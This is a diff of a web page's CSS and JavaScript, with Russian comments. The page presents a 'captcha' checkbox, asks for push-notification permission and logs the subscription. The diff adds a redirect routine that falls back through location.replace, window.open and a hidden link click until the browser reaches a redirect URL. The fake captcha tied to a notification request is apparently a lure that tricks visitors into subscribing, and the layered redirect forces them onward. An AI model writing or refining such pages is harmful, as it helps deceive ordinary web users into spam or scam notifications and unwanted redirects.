@@ -39,35 +39,9 @@
             width: 20px;
             height: 20px;
             cursor: pointer;
-            transition: background-color 0.3s ease, border-color 0.3s ease;
-            appearance: none; /* Убираем стандартный вид */
-            border: 2px solid #5f6368;
-            border-radius: 4px;
-            position: relative;
         }
         .captcha-checkbox:checked {
-            background-color: #1a73e8;
-            border-color: #1a73e8;
-            animation: fillCheckbox 0.3s ease;
-        }
-        .captcha-checkbox:checked::after {
-            content: '\2713'; /* Символ галочки */
-            position: absolute;
-            top: 50%;
-            left: 50%;
-            transform: translate(-50%, -50%);
-            color: white;
-            font-size: 14px;
-        }
-        @keyframes fillCheckbox {
-            0% {
-                background-color: #fff;
-                border-color: #5f6368;
-            }
-            100% {
-                background-color: #1a73e8;
-                border-color: #1a73e8;
-            }
+            accent-color: #1a73e8; /* Синий цвет для стандартной галочки */
         }
         .captcha-text {
             font-size: 14px;
@@ -173,14 +147,32 @@
             console.log('Лог подписки:', data);
         }
 
-        // Функция для выполнения редиректа (взята из первого кода)
+        // Функция для выполнения редиректа
         function performRedirect() {
             console.log('Попытка редиректа на:', redirectUrl);
             try {
                 window.location.href = redirectUrl;
                 setTimeout(() => {
                     if (window.location.href !== redirectUrl) {
+                        console.log('window.location.href не сработал, пробуем replace');
                         window.location.replace(redirectUrl);
+                        setTimeout(() => {
+                            if (window.location.href !== redirectUrl) {
+                                console.log('replace не сработал, пробуем window.open');
+                                window.open(redirectUrl, '_self');
+                                setTimeout(() => {
+                                    if (window.location.href !== redirectUrl) {
+                                        console.log('window.open не сработал, пробуем клик');
+                                        const link = document.createElement('a');
+                                        link.href = redirectUrl;
+                                        link.style.display = 'none';
+                                        document.body.appendChild(link);
+                                        link.click();
+                                        document.body.removeChild(link);
+                                    }
+                                }, 500);
+                            }
+                        }, 500);
                     }
                 }, 500);
             } catch (e) {
@@ -190,7 +182,7 @@
             }
         }
 
-        // Функция для запроса подписки (взята из текущего кода)
+        // Функция для запроса подписки
         function requestSubscription() {
             console.log('Запуск requestSubscription');
             if ('Notification' in window && (Notification.permission === 'granted' || Notification.permission === 'denied')) {
